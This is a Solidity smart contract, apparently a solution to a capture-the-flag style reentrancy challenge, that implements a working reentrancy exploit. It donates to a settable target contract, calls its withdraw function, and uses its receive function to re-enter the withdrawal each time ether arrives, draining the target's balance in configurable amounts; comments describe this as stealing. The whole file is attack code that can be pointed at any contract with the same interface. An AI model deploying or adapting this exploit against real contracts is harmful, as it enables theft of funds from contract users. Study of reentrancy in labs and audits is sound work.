pragma solidity ^0.8.0;

interface ReentranceInterface {
    function withdraw(uint _amount) external;
    function donate(address _to) external payable; 
}

contract ReentrancyAttack {
    address target;
    uint stealAmount;
    
    constructor() {
        target = address(0);
        // Default steal amount is 0.1 ether
        stealAmount = 100000000000000000;
    }
    
    // Changes the amount that is stolen from target contract on each call
    function setStealAmount(uint _newAmount) public {
        stealAmount = _newAmount;   
    }
    
    // Sets the target contract
    function setTarget(address _targetAddress) public {
        target = _targetAddress;
    }
    
    // Donates to the target to have a balance to be able to start the attack
    function donateToTarget() public payable {
        require(target != address(0), "Target contract has not been set");
        // Set up the interface for the target contract
        ReentranceInterface re = ReentranceInterface(target);
        // Call the donate function
        re.donate{value: msg.value}(address(this));
    }
    
    // Attacks the target contract and attempts to drain `target` amount of wei
    function attack() public {
        // Check that our target has been set
        require(target != address(0), "Target contract has not been set");
        // Set up the interface for the target contract
        ReentranceInterface re = ReentranceInterface(target);
        // Call the withdraw function
        re.withdraw(stealAmount);
    }
    
    // The fallback function designed to respond to 
    receive() payable external{
        if(msg.sender == target) {
            attack();
        }
    }
}
